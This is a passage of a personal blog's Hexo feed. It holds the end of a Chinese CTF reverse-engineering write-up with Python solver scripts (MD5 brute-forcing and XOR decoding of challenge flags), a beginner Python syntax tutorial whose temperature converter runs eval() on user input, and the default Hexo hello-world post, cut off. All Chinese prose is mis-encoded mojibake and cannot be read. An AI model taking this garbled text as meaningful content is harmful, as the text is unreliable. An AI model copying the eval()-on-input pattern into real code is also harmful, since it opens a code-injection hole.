class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>): <span class="comment">#&#x27; &#x27;åˆ°&#x27;~&#x27; ASCII</span></span><br><span class="line">            ret_list = func(i)</span><br><span class="line">            s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ret_list)):</span><br><span class="line">                s += <span class="built_in">str</span>(ret_list[idx])</span><br><span class="line">                s += <span class="built_in">str</span>(ret_list[(<span class="built_in">len</span>(ret_list) - idx - <span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line">            md5 = hashlib.md5()</span><br><span class="line">            md5.update(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> md5.hexdigest() == check[j]:</span><br><span class="line">                flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;You win!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + md5.hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h2><p>é€†å‘ç­¾åˆ°é¢˜ï¼ˆğŸ‘´ç»ˆäºæœ‰ä¼šåšçš„äº†ï¼‰ç”¨idaæ‰“å¼€æ‰¾åˆ°è¿ç®—å‡½æ•°ï¼Œç›´æ¥åšä¸è¿ç®—å°±è¡Œ</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150755.png" alt="image-20201108191655442"></p><p>æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯åœ¨c++ä¸­   <strong>\â€œ</strong>   æ˜¯ä»£è¡¨   <strong>â€œ</strong>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">s = <span class="built_in">str</span>(<span class="string">r&#x27;7d21e&lt;e3&lt;:3;9;ji t r#w&quot;$*&#123;*+*$|,&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    b = s[i]</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(b)^i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">ord</span>(b)^i,s[i])</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="easyZ"><a href="#easyZ" class="headerlink" title="easyZ"></a>easyZ</h2><p>å‘ç°æ–‡ä»¶å¹¶ä¸èƒ½ç”¨idaè°ƒè¯•ï¼Œåˆ†ææ— æœåæ€è·¯æ–­äº†æš‚æ— æ€è·¯ï¼Œçœ‹wpä¹Ÿæœ‰äº›ğŸ˜µï¼Œå…ˆæ”¾ç€å·©å›ºä¸€ä¸‹çŸ¥è¯†å†æ¥å›é¡¾ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2020æ¹–æ¹˜æ¯å¤ç›˜ï¼ˆå¤§æ¦‚ï¼‰&quot;&gt;&lt;a href=&quot;#2020æ¹–æ¹˜æ¯å¤ç›˜ï¼ˆå¤§æ¦‚ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;2020æ¹–æ¹˜æ¯å¤ç›˜ï¼ˆå¤§æ¦‚ï¼‰&quot;&gt;&lt;/a&gt;2020æ¹–æ¹˜æ¯å¤ç›˜ï¼ˆå¤§æ¦‚ï¼‰&lt;/h1&gt;&lt;p&gt;è¿˜æ˜¯ä¹å“¥ğŸ‚ğŸºå•Šï¼Œå·®ä¸€ç‚¹akï¼Œç”šè‡³æ‹¿åˆ°ä¸€è¡€ï¼ŒğŸ‘´å°±</summary>
      
    
    
    
    <category term="reverse ctf" scheme="http://example.com/categories/reverse-ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>pythonå­¦ä¹ pythonçš„åŸºç¡€è¯­æ³•</title>
    <link href="http://example.com/2021/08/13/1.python%E5%AD%A6%E4%B9%A0python%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
    <id>http://example.com/2021/08/13/1.python%E5%AD%A6%E4%B9%A0python%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</id>
    <published>2021-08-13T11:39:43.621Z</published>
    <updated>2021-08-13T07:29:56.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŸºæœ¬è¯­æ³•å…ƒç´ "><a href="#åŸºæœ¬è¯­æ³•å…ƒç´ " class="headerlink" title="åŸºæœ¬è¯­æ³•å…ƒç´ "></a>åŸºæœ¬è¯­æ³•å…ƒç´ </h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#TemConvert.py</span></span><br><span class="line">TempStr = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥å¸¦æœ‰ç¬¦å·çš„æ¸©åº¦å€¼:&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> TempStr[-<span class="number">1</span>] <span class="keyword">in</span> [<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;f&#x27;</span>]:</span><br><span class="line">    C = (<span class="built_in">eval</span>(TempStr[<span class="number">0</span>:-<span class="number">1</span>]) - <span class="number">32</span>)/<span class="number">1.8</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è½¬æ¢åçš„æ¸©åº¦æ˜¯&#123;:.2f&#125;C&quot;</span>.<span class="built_in">format</span>(C))</span><br><span class="line"><span class="keyword">elif</span> TempStr[-<span class="number">1</span>] <span class="keyword">in</span> [<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]:</span><br><span class="line">        F = <span class="number">1.8</span>*<span class="built_in">eval</span>(TempStr[<span class="number">0</span>:-<span class="number">1</span>])+<span class="number">32</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è½¬æ¢åçš„æ¸©åº¦æ˜¯&#123;:.2f&#125;F&quot;</span>.<span class="built_in">format</span>(F))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¾“å…¥æ ¼å¼é”™è¯¯&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="ç¨‹åºçš„æ ¼å¼æ¡†æ¶"><a href="#ç¨‹åºçš„æ ¼å¼æ¡†æ¶" class="headerlink" title="ç¨‹åºçš„æ ¼å¼æ¡†æ¶"></a>ç¨‹åºçš„æ ¼å¼æ¡†æ¶</h2><h3 id="ç¼©è¿›"><a href="#ç¼©è¿›" class="headerlink" title="ç¼©è¿›"></a><strong>ç¼©è¿›</strong></h3><p>ä¸€è¡Œä»£ç å¼€å§‹å‰çš„ç©ºç™½åŒºåŸŸï¼Œè¡¨è¾¾ç¨‹åºçš„æ ¼å¼æ¡†æ¶</p><p>å•ç¨‹ç¼©è¿›   å¤šå±‚ç¼©è¿›</p><h4 id="ä¸¥æ ¼æ˜ç¡®"><a href="#ä¸¥æ ¼æ˜ç¡®" class="headerlink" title="ä¸¥æ ¼æ˜ç¡®"></a><strong>ä¸¥æ ¼æ˜ç¡®</strong></h4><p>ç¼©è¿›æ˜¯è¯­æ³•çš„ä¸€éƒ¨åˆ†ï¼Œç¼©è¿›ä¸æ­£ç¡®ç¨‹åºè¿è¡Œé”™è¯¯</p><h4 id="æ‰€å±å…³ç³»"><a href="#æ‰€å±å…³ç³»" class="headerlink" title="æ‰€å±å…³ç³»"></a><strong>æ‰€å±å…³ç³»</strong></h4><p>è¡¨è¾¾ä»£ç é—´åŒ…å«å’Œå±‚æ¬¡å…³ç³»çš„å”¯ä¸€ æ‰‹æ®µ</p><h4 id="é•¿åº¦ä¸€è‡´"><a href="#é•¿åº¦ä¸€è‡´" class="headerlink" title="é•¿åº¦ä¸€è‡´"></a><strong>é•¿åº¦ä¸€è‡´</strong></h4><p>ç¨‹åºå†…ä¸€è‡´å³å¯ï¼Œä¸€èˆ¬ç”¨4ä¸ªç©ºæ ¼æˆ–1ä¸ªTAB</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#TemConvert.py</span></span><br></pre></td></tr></table></figure><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a><strong>æ³¨é‡Š</strong></h3><p>ç”¨æ¥æé«˜ä»£ç å¯è¯»æ€§çš„è¾…åŠ©æ€§æ–‡å­—ï¼Œä¸è¢«æ‰§è¡Œ</p><h4 id="å•è¡Œæ³¨é‡Š"><a href="#å•è¡Œæ³¨é‡Š" class="headerlink" title="å•è¡Œæ³¨é‡Š"></a><strong>å•è¡Œæ³¨é‡Š</strong></h4><p>ä»¥#å¼€å¤´ ,å…¶åå†…å®¹ä¸ºæ³¨é‡Š</p><p>#è¿™é‡Œæ˜¯å•è¡Œæ³¨é‡Š</p><h4 id="å¤šè¡Œæ³¨é‡Š"><a href="#å¤šè¡Œæ³¨é‡Š" class="headerlink" title="å¤šè¡Œæ³¨é‡Š"></a><strong>å¤šè¡Œæ³¨é‡Š</strong></h4><p>ä»¥â€™â€™â€™å¼€å¤´å’Œç»“å°¾</p><p>â€˜â€™â€™è¿™æ˜¯å¤šè¡Œæ³¨é‡Šç¬¬ä¸€è¡Œ<br>è¿™æ˜¯å¤šè¡Œæ³¨é‡Šç¬¬äºŒè¡Œâ€™â€™â€™</p><h1 id="å‘½åä¸ä¿ç•™å­—"><a href="#å‘½åä¸ä¿ç•™å­—" class="headerlink" title="å‘½åä¸ä¿ç•™å­—"></a>å‘½åä¸ä¿ç•™å­—</h1><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194140.jpeg" alt="aS5UzR.jpg"></p><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><p>å˜é‡é‡‡ç”¨æ ‡è¯†ç¬¦(åå­—) æ¥è¡¨ç¤ºï¼Œå…³è”æ ‡è¯†ç¬¦çš„è¿‡ç¨‹å«å‘½å<br>TempStræ˜¯å˜é‡åå­—<br>å¯ä»¥ä½¿ç”¨ç­‰å·(=)å‘å˜é‡èµ‹å€¼æˆ–ä¿®æ”¹å€¼, =è¢«ç§°ä¸ºèµ‹å€¼ç¬¦å·<br>TempStr= â€œ82Fâ€ #å‘å˜é‡TempStrèµ‹å€¼â€™82Fâ€</p><h3 id="å‘½å"><a href="#å‘½å" class="headerlink" title="å‘½å"></a>å‘½å</h3><p>å…³è”æ ‡è¯†ç¬¦çš„è¿‡ç¨‹</p><h4 id="å‘½åè§„åˆ™"><a href="#å‘½åè§„åˆ™" class="headerlink" title="å‘½åè§„åˆ™"></a>å‘½åè§„åˆ™</h4><p>å¤§å°å†™å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿å’Œæ±‰å­—ç­‰å­—ç¬¦åŠç»„åˆ<br>å¦‚:TempStrï¼ŒPython_Greatï¼Œè¿™æ˜¯é—¨Pythonå¥½è¯¾</p><h4 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h4><p>å¤§å°å†™æ•æ„Ÿã€é¦–å­—ç¬¦ä¸èƒ½æ˜¯æ•°å­—ã€ä¸ä¸ä¿ç•™å­—ç›¸åŒ<br>Pythonå’Œpythonæ˜¯ä¸åŒå˜é‡ï¼Œ123Pythonæ˜¯ä¸åˆæ³•çš„</p><p><strong>è¢«ç¼–ç¨‹è¯­è¨€å†…éƒ¨å®šä¹‰å¹¶ä¿ç•™ä½¿ç”¨çš„æ ‡è¯†ç¬¦</strong><br>-Pythonè¯­è¨€æœ‰33ä¸ªä¿ç•™å­—(ä¹Ÿå«å…³é”®å­—)<br>if,elif, else, in<br>-ä¿ç•™å­—æ˜¯ç¼–ç¨‹è¯­è¨€çš„åŸºæœ¬å•è¯ï¼Œå¤§å°å†™æ•æ„Ÿ<br>ifæ˜¯ä¿ç•™å­—ï¼ŒIfæ˜¯å˜é‡</p><h3 id="ä¿ç•™å­—"><a href="#ä¿ç•™å­—" class="headerlink" title="ä¿ç•™å­—"></a>ä¿ç•™å­—</h3><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194145.jpeg" alt="aS5rdO.jpg"></p><h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194149.jpeg" alt="aS5oTS.jpg"></p><p>10,011,101</p><h3 id="æ•´æ•°ç±»å‹"><a href="#æ•´æ•°ç±»å‹" class="headerlink" title="æ•´æ•°ç±»å‹:"></a>æ•´æ•°ç±»å‹:</h3><p>10011101</p><h3 id="å­—ç¬¦ä¸²ç±»å‹"><a href="#å­—ç¬¦ä¸²ç±»å‹" class="headerlink" title="å­—ç¬¦ä¸²ç±»å‹"></a>å­—ç¬¦ä¸²ç±»å‹</h3><p>â€œ10,011,101â€</p><h3 id="åˆ—è¡¨ç±»å‹"><a href="#åˆ—è¡¨ç±»å‹" class="headerlink" title="åˆ—è¡¨ç±»å‹"></a>åˆ—è¡¨ç±»å‹</h3><p>[10ï¼Œ011ï¼Œ101]</p><p>ç”±0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ç»„æˆçš„æœ‰åºå­—ç¬¦åºåˆ—</p><h4 id="å­—ç¬¦ä¸²ç”±ä¸€å¯¹å•å¼•å·æˆ–ä¸€å¯¹åŒå¼•å·è¡¨ç¤º"><a href="#å­—ç¬¦ä¸²ç”±ä¸€å¯¹å•å¼•å·æˆ–ä¸€å¯¹åŒå¼•å·è¡¨ç¤º" class="headerlink" title="å­—ç¬¦ä¸²ç”±ä¸€å¯¹å•å¼•å·æˆ–ä¸€å¯¹åŒå¼•å·è¡¨ç¤º"></a>å­—ç¬¦ä¸²ç”±ä¸€å¯¹å•å¼•å·æˆ–ä¸€å¯¹åŒå¼•å·è¡¨ç¤º</h4><p>â€œè¯·è¾“å…¥å¸¦æœ‰ç¬¦å·çš„æ¸©åº¦å€¼:â€æˆ–è€…â€˜Câ€™</p><h4 id="å­—ç¬¦ä¸²æ˜¯å­—ç¬¦çš„æœ‰åºåºåˆ—ï¼Œå¯ä»¥å¯¹å…¶ä¸­çš„å­—ç¬¦è¿›è¡Œç´¢å¼•"><a href="#å­—ç¬¦ä¸²æ˜¯å­—ç¬¦çš„æœ‰åºåºåˆ—ï¼Œå¯ä»¥å¯¹å…¶ä¸­çš„å­—ç¬¦è¿›è¡Œç´¢å¼•" class="headerlink" title="å­—ç¬¦ä¸²æ˜¯å­—ç¬¦çš„æœ‰åºåºåˆ—ï¼Œå¯ä»¥å¯¹å…¶ä¸­çš„å­—ç¬¦è¿›è¡Œç´¢å¼•"></a>å­—ç¬¦ä¸²æ˜¯å­—ç¬¦çš„æœ‰åºåºåˆ—ï¼Œå¯ä»¥å¯¹å…¶ä¸­çš„å­—ç¬¦è¿›è¡Œç´¢å¼•</h4><p>â€œè¯·â€æ˜¯â€è¯·è¾“å…¥å¸¦æœ‰ç¬¦å·çš„æ¸©åº¦å€¼:â€çš„ç¬¬0ä¸ªå­—ç¬¦</p><h3 id="å­—ç¬¦ä¸²çš„åºå·"><a href="#å­—ç¬¦ä¸²çš„åºå·" class="headerlink" title="å­—ç¬¦ä¸²çš„åºå·"></a>å­—ç¬¦ä¸²çš„åºå·</h3><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194152.jpeg" alt="aS5jO0.jpg"></p><h3 id="å­—ç¬¦ä¸²çš„ä½¿ç”¨"><a href="#å­—ç¬¦ä¸²çš„ä½¿ç”¨" class="headerlink" title="å­—ç¬¦ä¸²çš„ä½¿ç”¨"></a>å­—ç¬¦ä¸²çš„ä½¿ç”¨</h3><p><strong>ä½¿ç”¨[]è·å–å­—ç¬¦ä¸²ä¸­ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</strong></p><h4 id="ç´¢å¼•âˆ¶"><a href="#ç´¢å¼•âˆ¶" class="headerlink" title="ç´¢å¼•âˆ¶"></a>ç´¢å¼•âˆ¶</h4><p>è¿”å›å­—ç¬¦ä¸²ä¸­å•ä¸ªå­—ç¬¦     &lt;å­—ç¬¦ä¸²&gt;[M]<br>â€œè¯·è¾“å…¥å¸¦æœ‰ç¬¦å·çš„æ¸©åº¦å€¼:â€[0]     æˆ–è€…     TempStr[-1]</p><h4 id="åˆ‡ç‰‡"><a href="#åˆ‡ç‰‡" class="headerlink" title="åˆ‡ç‰‡:"></a>åˆ‡ç‰‡:</h4><p>è¿”å›å­—ç¬¦ä¸²ä¸­ä¸€æ®µå­—ç¬¦å­ä¸²    &lt;å­—ç¬¦ä¸²&gt;[M:N]<br>â€œè¯·è¾“å…¥å¸¦æœ‰ç¬¦å·çš„æ¸©åº¦å€¼:â€[1:3]    æˆ–è€…    TempStr[0:-1]</p><p><strong>[0:-1]è¡¨ç¤ºçš„æ˜¯ä»0ä¸ªå­—ç¬¦å¼€å§‹ä½†ä¸åˆ°æœ€åä¸€ä¸ªå­—ç¬¦ å»æ‰äº†æœ€åä¸€ä¸ªå­—ç¬¦</strong></p><p>æ•´æ•°å’Œæµ®ç‚¹æ•°éƒ½æ˜¯æ•°å­—ç±»å‹</p><p>-æ•´æ•°æ•°å­¦ä¸­çš„æ•´æ•°</p><p>32æˆ–è€…-89</p><p>-æµ®ç‚¹æ•°æ•°å­¦ä¸­çš„å®æ•°ï¼Œå¸¦æœ‰å°æ•°éƒ¨åˆ†</p><p>1.8æˆ–è€…-1.8æˆ–è€…-1.0</p><p>ç”±0ä¸ªæˆ–å¤šä¸ªæ•°æ®ç»„æˆçš„æœ‰åºåºåˆ—<br>-åˆ—è¡¨ä½¿ç”¨[]è¡¨ç¤ºï¼Œé‡‡ç”¨é€—å·)åˆ†éš”å„å…ƒç´ <br>[ â€˜Fâ€™,â€™fâ€™]è¡¨ç¤ºä¸¤ä¸ªå…ƒç´ â€™Fâ€™å’Œâ€™fâ€™<br>-ä½¿ç”¨ä¿ç•™å­—inåˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨åˆ—è¡¨ä¸­<br>TempStr[-1] in[ â€˜Câ€™, â€˜câ€™]åˆ¤æ–­å­—ç¬¦ä¸²æœ€åä¸€ä¸ªæ˜¯å¦ä¸åˆ—è¡¨ä¸­æŸä¸ªå…ƒç´ ç›¸åŒ</p><h2 id="è¯­å¥ä¸å‡½æ•°"><a href="#è¯­å¥ä¸å‡½æ•°" class="headerlink" title="è¯­å¥ä¸å‡½æ•°"></a>è¯­å¥ä¸å‡½æ•°</h2><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194158.jpeg" alt="aSIPfJ.jpg"></p><h3 id="èµ‹å€¼è¯­å¥"><a href="#èµ‹å€¼è¯­å¥" class="headerlink" title="èµ‹å€¼è¯­å¥"></a>èµ‹å€¼è¯­å¥</h3><h4 id="ç”±èµ‹å€¼ç¬¦å·æ„æˆçš„ä¸€è¡Œä»£ç "><a href="#ç”±èµ‹å€¼ç¬¦å·æ„æˆçš„ä¸€è¡Œä»£ç " class="headerlink" title="ç”±èµ‹å€¼ç¬¦å·æ„æˆçš„ä¸€è¡Œä»£ç "></a>ç”±èµ‹å€¼ç¬¦å·æ„æˆçš„ä¸€è¡Œä»£ç </h4><p>-èµ‹å€¼è¯­å¥ç”¨æ¥ç»™å˜é‡èµ‹äºˆæ–°çš„æ•°æ®å€¼<br>C=(eval(TempStr[0:-1])-32)/1.8    #å³ä¾§è¿ç®—ç»“æœèµ‹ç»™å˜é‡C<br>-èµ‹å€¼è¯­å¥å³ä¾§çš„æ•°æ®ç±»å‹åŒæ—¶ä½œç”¨äºå˜é‡<br>TempStr=input(â€œâ€)     #input()è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒTempSträ¹Ÿæ˜¯å­—ç¬¦ä¸²</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194204.jpeg" alt="aSIZm6.jpg"></p><h3 id="åˆ†æ”¯è¯­å¥"><a href="#åˆ†æ”¯è¯­å¥" class="headerlink" title="åˆ†æ”¯è¯­å¥"></a>åˆ†æ”¯è¯­å¥</h3><p>ç”±åˆ¤æ–­æ¡ä»¶å†³å®šç¨‹åºè¿è¡Œæ–¹å‘çš„è¯­å¥<br>-ä½¿ç”¨ä¿ç•™å­—ifelifelseæ„æˆæ¡ä»¶åˆ¤æ–­çš„åˆ†æ”¯ç»“æ„<br>if TempStr[-1] in[â€˜Fâ€™,â€™fâ€™]:#å¦‚æœæ¡ä»¶ä¸ºTrueåˆ™æ‰§è¡Œå†’å·åè¯­å¥<br>-æ¯ä¸ªä¿ç•™å­—æ‰€åœ¨è¡Œæœ€åå­˜åœ¨ä¸€ä¸ªå†’å·(:)ï¼Œè¯­æ³•çš„ä¸€éƒ¨åˆ†<br>å†’å·åŠåç»­ç¼©è¿›ç”¨æ¥è¡¨ç¤ºåç»­è¯­å¥ä¸æ¡ä»¶çš„æ‰€å±å…³ç³»</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194209.jpeg" alt="aSImTO.jpg"></p><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><p>æ ¹æ®è¾“å…¥å‚æ•°äº§ç”Ÿä¸åŒè¾“å‡ºçš„åŠŸèƒ½è¿‡ç¨‹<br>-ç±»ä¼¼æ•°å­¦ä¸­çš„å‡½æ•°ï¼Œy = f(x)<br>print(â€œè¾“å…¥æ ¼å¼é”™è¯¯â€â€)#æ‰“å°è¾“å‡ºâ€œè¾“å…¥æ ¼å¼é”™è¯¯â€<br>-å‡½æ•°é‡‡ç”¨&lt;å‡½æ•°å&gt;(&lt;å‚æ•°&gt;)æ–¹å¼ä½¿ç”¨<br>eval(TempStr[0:-1])    #Tempstr[0:-1]æ˜¯å‚æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194214.jpeg" alt="aSI11A.jpg"></p><h2 id="Pythonç¨‹åºçš„è¾“å…¥è¾“å‡º"><a href="#Pythonç¨‹åºçš„è¾“å…¥è¾“å‡º" class="headerlink" title="Pythonç¨‹åºçš„è¾“å…¥è¾“å‡º"></a>Pythonç¨‹åºçš„è¾“å…¥è¾“å‡º</h2><h3 id="è¾“å…¥å‡½æ•°input"><a href="#è¾“å…¥å‡½æ•°input" class="headerlink" title="è¾“å…¥å‡½æ•°input()"></a>è¾“å…¥å‡½æ•°input()</h3><p>ä»æ§åˆ¶å°è·å¾—ç”¨æˆ·è¾“å…¥çš„å‡½æ•°<br>-input()å‡½æ•°çš„ä½¿ç”¨æ ¼å¼âˆ¶<br>&lt;å˜é‡&gt;= input(&lt;æç¤ºä¿¡æ¯å­—ç¬¦ä¸²&gt;)<br>-ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯ä»¥å­—ç¬¦ä¸²ç±»å‹ä¿å­˜åœ¨&lt;å˜é‡&gt;ä¸­<br>TempStr = input(â€œè¯·è¾“å…¥â€)    #TempSträ¿å­˜ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194220.jpeg" alt="aSI8Xt.jpg"></p><h3 id="è¾“å‡ºå‡½æ•°print"><a href="#è¾“å‡ºå‡½æ•°print" class="headerlink" title="è¾“å‡ºå‡½æ•°print()"></a>è¾“å‡ºå‡½æ•°print()</h3><p>ä»¥å­—ç¬¦å½¢å¼å‘æ§åˆ¶å°è¾“å‡ºç»“æœçš„å‡½æ•°<br>-print()å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨æ ¼å¼:<br>print(&lt;æ‹Ÿè¾“å‡ºå­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²å˜é‡&gt;)<br>-å­—ç¬¦ä¸²ç±»å‹çš„ä¸€å¯¹å¼•å·ä»…åœ¨ç¨‹åºå†…éƒ¨ä½¿ç”¨ï¼Œè¾“å‡ºæ— å¼•å·<br>print(â€œè¾“å…¥æ ¼å¼é”™è¯¯â€)    #å‘æ§åˆ¶å°è¾“å‡ºè¾“å…¥æ ¼å¼é”™è¯¯</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194249.jpeg" alt="aSIt78.jpg"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194254.jpeg" alt="aSIatg.jpg"></p><h3 id="è¯„ä¼°å‡½æ•°eval"><a href="#è¯„ä¼°å‡½æ•°eval" class="headerlink" title="è¯„ä¼°å‡½æ•°eval()"></a>è¯„ä¼°å‡½æ•°eval()</h3><p>å»æ‰å‚æ•°æœ€å¤–ä¾§å¼•å·å¹¶æ‰§è¡Œä½™ä¸‹è¯­å¥çš„å‡½æ•°<br>-eval()å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨æ ¼å¼ï¸°<br>eval(&lt;å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²å˜é‡&gt;)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;1+2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;1+2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>( <span class="string">&#x27;print(&quot;Hello&quot;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Hello</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åŸºæœ¬è¯­æ³•å…ƒç´ &quot;&gt;&lt;a href=&quot;#åŸºæœ¬è¯­æ³•å…ƒç´ &quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬è¯­æ³•å…ƒç´ &quot;&gt;&lt;/a&gt;åŸºæœ¬è¯­æ³•å…ƒç´ &lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu</summary>
      
    
    
    
    <category term="pythonè¯­æ³•" scheme="http://example.com/categories/python%E8%AF%AD%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>hello world</title>
    <link href="http://example.com/2021/08/13/hello-world/"/>
    <id>http://example.com/2021/08/13/hello-world/</id>
    <published>2021-08-13T08:53:22.327Z</published>
    <updated>2021-08-13T07:42:48.753Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a 